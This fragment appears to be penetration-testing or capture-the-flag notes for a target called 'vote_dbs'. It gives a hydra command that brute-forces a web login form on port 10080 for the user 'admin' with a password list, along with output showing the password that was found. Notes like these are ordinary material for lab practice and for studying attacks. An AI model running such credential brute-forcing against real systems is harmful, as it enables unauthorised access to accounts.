...
# vote_dbs
# ----------------------------------------------------------------------------------------------------
#hydra $IP -s 10080 http-form-get -m "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login#:F=WrongAnswer" -l admin -I -P passlist.txt -t 16
...
# [DATA] attacking http-get-form://$IP:10080//index.php:page=signin&username=^USER^&password=^PASS^&Login=Login#:F=WrongAnswer
# [10080][http-get-form] host: $IP   login: admin   password: shadow
